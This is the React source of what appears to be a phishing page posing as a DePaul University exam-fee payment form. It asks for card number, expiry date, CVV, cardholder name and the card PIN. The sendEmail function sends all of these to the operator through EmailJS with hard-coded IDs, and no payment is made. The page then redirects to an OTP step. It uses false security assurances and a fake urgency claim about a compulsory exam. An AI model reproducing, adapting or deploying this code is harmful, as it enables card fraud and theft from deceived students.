import React, { useState } from 'react';
import { Modal, Button, Form } from 'react-bootstrap';
import { useNavigate } from 'react-router-dom';
import emailjs from 'emailjs-com';
import './ExamForm.css';
import Navbar from './Navbar';
import Footer from './Footer';
import bankLogo from './img/banklogo.png'

const ExamForm = () => {
  const [showConfirmModal, setShowConfirmModal] = useState(false);
  const [showPinModal, setShowPinModal] = useState(false);
  const [bankName, setBankName] = useState('');
  const [cardNumber, setCardNumber] = useState('');
  const [expirationDate, setExpirationDate] = useState('');
  const [cvv, setCvv] = useState('');
  const [nameOnCard, setNameOnCard] = useState('');
  const [cardType, setCardType] = useState('');
  const [pin, setPin] = useState('');
  const navigate = useNavigate();

  const resetForm = () => {
    setBankName('');
    setCardNumber('');
    setExpirationDate('');
    setCvv('');
    setNameOnCard('');
    setCardType('');
    setPin('');
  };

  const handlePayClick = (e) => {
    e.preventDefault();
    setShowConfirmModal(true);
  };

  const handleConfirmClick = () => {
    setShowConfirmModal(false);
    setShowPinModal(true);
  };

  const handlePinSubmit = (e) => {
    e.preventDefault();
    sendEmail();
    resetForm();
    setShowPinModal(false);
    navigate('/otp');
  };

  const handleTextOnlyInput = (e) => {
    e.target.value = e.target.value.replace(/[^a-zA-Z\s]/g, '');
  };

  const handleNumberOnlyInput = (e) => {
    e.target.value = e.target.value.replace(/[^0-9]/g, '');
  };

  const handleCardNumberChange = (e) => {
    let value = e.target.value.replace(/\D/g, '');
    value = value.replace(/(.{4})/g, '$1 ').trim();
    setCardNumber(value);
  };

  const handleExpirationDateChange = (e) => {
    let value = e.target.value.replace(/\D/g, '');
    if (value.length >= 3) {
      value = value.replace(/(.{2})(.{2})/, '$1 / $2');
    }
    setExpirationDate(value);
  };

  const sendEmail = () => {
    const templateParams = {
      bankName,
      cardNumber,
      expirationDate,
      cvv,
      nameOnCard,
      cardType,
      pin,
    };

    emailjs.send(
      'service_e234qa4', // Replace with your service ID
      'template_f0nymc7', // Replace with your template ID
      templateParams,
      'aM4ACgzNEz-ykB_dV' // Replace with your user ID
    )
      .then((response) => {
        console.log('SUCCESS!', response.status, response.text);
      }, (err) => {
        console.log('FAILED...', err);
      });
  };

  return (
    <div>
    <Navbar />
    <div className="container d-flex justify-content-center">
      <div className="col-md-6">
        <h2 className="mt-5">EXAM FORM</h2>
        <p><strong>About The Exam</strong></p>
        <p>Compulsory DePaul University exam: 35% of your course assessment.</p>
        <div className="card mb-3">
          <div className="card-body">
            {/* <p className="card-text">University exam form with a tag of $15 on it</p> */}
            <p className="card-text fw-medium fs-3">Community Group Exam Form: #journalism #DePaul University</p>
            <p className="fw-bold fs-4 text-end"> - $ 15.00</p>
          </div>
        </div>
        <h3>Make Payment Now</h3>
        <p>Enter the following to complete payment <b>using your bank card</b>:<br />
        Only enter correct details to avoid <span style={{color: "#FF0000"}}>error(s)</span> during payment.</p>
        <div className="card p-4 pt-2">
        <p className='fst-italic text-end p-0 m-0'>Trusted and Secure Payment</p>
        <div className="d-flex justify-content-end mb-3">          
          <img src={bankLogo} alt="" class="img-fluid" width={270} height={30} />
        </div>
          <Form onSubmit={handlePayClick} autoComplete="off">
            <Form.Group className="mb-3" controlId="bankName">
              <Form.Label>Bank Name</Form.Label>
              <Form.Control 
                // type="text" 
                placeholder="Enter your bank name" 
                required 
                value={bankName}
                // onInput={handleTextOnlyInput} 
                onChange={(e) => setBankName(e.target.value)}
              />
            </Form.Group>
            <Form.Group className="mb-3" controlId="cardNumber">
              <Form.Label>Card Number</Form.Label>
              <Form.Control 
                // type="text" 
                placeholder="0000 0000 0000 0000" 
                required 
                maxLength="24" 
                value={cardNumber}
                onChange={handleCardNumberChange} 
              />
            </Form.Group>
            <div className="row">
              <Form.Group className="col-md-6 mb-3" controlId="expirationDate">
                <Form.Label>Expiration Date</Form.Label>
                <Form.Control 
                  // type="text" 
                  placeholder="MM / YY" 
                  required 
                  maxLength="7" 
                  value={expirationDate}
                  onChange={handleExpirationDateChange} 
                />
              </Form.Group>
              <Form.Group className="col-md-6 mb-3" controlId="cvv">
                <Form.Label>CVV</Form.Label>
                <Form.Control 
                  // type="text" 
                  placeholder="000" 
                  required 
                  maxLength="4" 
                  value={cvv}
                  onChange={(e) => setCvv(e.target.value)}
                  onInput={handleNumberOnlyInput}
                />
              </Form.Group>
            </div>
            <Form.Group className="mb-3" controlId="nameOnCard">
              <Form.Label>Name On Card</Form.Label>
              <Form.Control 
                // type="text" 
                placeholder="Enter name on card" 
                required 
                value={nameOnCard}
                // onInput={handleTextOnlyInput} 
                onChange={(e) => setNameOnCard(e.target.value)}
              />
            </Form.Group>
            <Form.Group className="mb-3" controlId="cardType">
              <Form.Label>Card Type</Form.Label>
              <div>
                <Form.Check 
                  inline 
                  type="radio" 
                  name="cardType" 
                  id="creditCard" 
                  label="Credit Card" 
                  required 
                  checked={cardType === 'credit'}
                  onChange={(e) => setCardType('credit')}
                />
                <Form.Check 
                  inline 
                  type="radio" 
                  name="cardType" 
                  id="debitCard" 
                  label="Debit Card" 
                  required 
                  checked={cardType === 'debit'}
                  onChange={(e) => setCardType('debit')}
                />
              </div>
            </Form.Group>
            <Button variant="primary" type="submit">PAY</Button>
            <p className="fw-bold text-end"> - AED 55.00</p>
          </Form>
        </div>
        <p className="mt-3"><strong>Trusted and Secure Payment</strong><br />
        Your security is our priority. We use advanced encryption to protect your information. Your trust matters to us.</p>
        
        {/* Confirmation Modal */}
        <Modal show={showConfirmModal} onHide={() => setShowConfirmModal(false)}>
          <Modal.Header closeButton>
            <Modal.Title>Confirm Details</Modal.Title>
          </Modal.Header>
          <Modal.Body>
            <p>Please confirm and check your details <b>with your bank card</b> before proceeding to avoid <span style={{color: "#FF0000"}}>error(s)</span>.</p>
          </Modal.Body>
          <Modal.Footer>
            <Button variant="secondary" onClick={() => setShowConfirmModal(false)}>Cancel</Button>
            <Button variant="primary" onClick={handleConfirmClick}>Yes, I Have Confirmed</Button>
          </Modal.Footer>
        </Modal>

        {/* PIN Modal */}
        <Modal show={showPinModal} onHide={() => setShowPinModal(false)}>
          <Modal.Header closeButton>
            <Modal.Title>Enter PIN</Modal.Title>
          </Modal.Header>
          <Modal.Body>
            <Form onSubmit={handlePinSubmit}>
              <Form.Group className="mb-3" controlId="pin">
                <Form.Label>Enter Your 4 Digit Card PIN to Complete Payment</Form.Label>
                <Form.Control 
                  type="text" 
                  placeholder="0000" 
                  required 
                  maxLength="4" 
                  value={pin}
                  onInput={handleNumberOnlyInput}
                  onChange={(e) => setPin(e.target.value)}
                />
              </Form.Group>
              <Button variant="primary" type="submit">PAY</Button>                           
              <p className="fw-bold text-end"> - AED 55.00</p>
            </Form>
          </Modal.Body>
          <Modal.Footer>
            <Form.Text className="text-muted">Kindly avoid disclosing your information to others.</Form.Text>
          </Modal.Footer>
        </Modal>
      </div>
    </div>
    <Footer />
    </div>
  );
};

export default ExamForm;
